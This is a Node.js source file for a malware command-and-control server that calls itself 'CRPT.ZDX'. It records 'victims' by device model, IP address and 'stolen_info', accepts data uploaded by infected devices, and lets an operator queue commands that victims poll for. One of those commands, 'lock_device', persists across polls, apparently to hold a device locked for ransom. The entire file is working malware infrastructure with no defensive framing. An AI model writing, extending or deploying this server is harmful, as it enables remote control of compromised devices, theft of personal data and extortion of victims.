const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const app = express();

app.use(express.json());

const db = new sqlite3.Database('vips.db');
db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS victims (id TEXT PRIMARY KEY, model TEXT, ip TEXT, last_seen TEXT, stolen_info TEXT)");
    db.run("CREATE TABLE IF NOT EXISTS commands (id TEXT PRIMARY KEY, cmd TEXT)");
});

app.post('/register', (req, res) => {
    const { id, model, data_stolen } = req.body;
    const ip = req.ip;
    const time = new Date().toLocaleString(); 
    
    db.run(`INSERT INTO victims (id, model, ip, last_seen, stolen_info) VALUES (?, ?, ?, ?, ?) 
            ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, stolen_info=excluded.stolen_info`, 
            [id, model, ip, time, data_stolen || ''], (err) => {
        if (err) return res.status(500).json({status: "error"});
        res.json({status: "ok"});
    });
});

app.get('/list', (req, res) => {
    db.all("SELECT * FROM victims", [], (err, rows) => {
        if (err) return res.status(500).json({status: "error"});
        res.json(rows.map(r => ({
            id: r.id, 
            model: r.model, 
            ip: r.ip, 
            seen: r.last_seen, 
            stolen_info: r.stolen_info 
        })));
    });
});

app.post('/send_command', (req, res) => {
    const { id, cmd } = req.body;
    db.run("INSERT OR REPLACE INTO commands VALUES (?, ?)", [id, cmd], () => {
        res.json({status: "success"});
    });
});

app.get('/get_command/:vic_id', (req, res) => {
    db.get("SELECT cmd FROM commands WHERE id=?", [req.params.vic_id], (err, row) => {
        if (row) {
            const currentCmd = row.cmd;

            if (currentCmd !== "lock_device") {
                db.run("DELETE FROM commands WHERE id=?", [req.params.vic_id]);
            }
            
            res.json({command: currentCmd});
        } else {
            res.json({command: "idle"});
        }
    });
});

const PORT = process.env.SERVER_PORT || 2266;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`[*] CRPT.ZDX Node Server is Running on port ${PORT}`);
    console.log(`[*] Polling Rate: 2s Optimized`);
});